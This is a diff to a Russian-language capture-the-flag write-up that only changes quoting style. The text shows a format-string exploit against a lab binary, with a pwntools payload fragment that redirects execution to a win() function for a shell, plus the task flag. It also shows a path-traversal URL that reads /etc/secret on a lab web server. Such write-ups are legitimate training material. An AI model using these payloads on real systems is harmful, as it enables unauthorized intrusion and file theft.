@@ -4,7 +4,7 @@ ____
 # Task based
 ## PWN
 ### 10 баллов
-Залив исходники в дизассемблер, мы можем заметить функцию 'win()', которая возвращает  '/bin/sh', способный дать нам контроль над машиной. В функции 'main()' содержится memory unsafe 'printf(format: &var_418)', уязвимая к f-strings. 
+Залив исходники в дизассемблер, мы можем заметить функцию `win()`, которая возвращает  `/bin/sh`, способный дать нам контроль над машиной. В функции `main()` содержится memory unsafe `printf(format: &var_418)`, уязвимая к f-strings. 
 ```shell
 ┌──(kali㉿KaliOlymp)-[~/Downloads]
 └─$ nc 192.168.12.13 1923        
@@ -71,7 +71,7 @@ payload = fmtstr_payload(6,payload_writes,write_size='short')
 p.sendline(payload)
 p.interactive()
 ```
-Эксплоит успешно передал управление функции 'win()', которая дала нам полный доступ к уязвимой машине
+Эксплоит успешно передал управление функции `win()`, которая дала нам полный доступ к уязвимой машине
 ```shell
 ┌──(kali㉿KaliOlymp)-[~/Desktop]
 └─$ python exploit.py -h ./main
@@ -114,7 +114,7 @@ $ cat flag
 nto{easy_formt_string}
 $  
 ```
-Мы получили флаг: 'nto{easy_formt_string}'
+Мы получили флаг: **nto{easy_formt_string}**
 ## Web 1
 На сайте мы сразу же видим число 20, на которое можно нажать. Нажав мы видим 'Hint_1 maybe in etc/secret ???'.
 Это явный намёк на LFI. Просто меняем путь в строке на http://192.168.12.10:5001/download?file_type=../../../../etc/secret и получаем флаг.
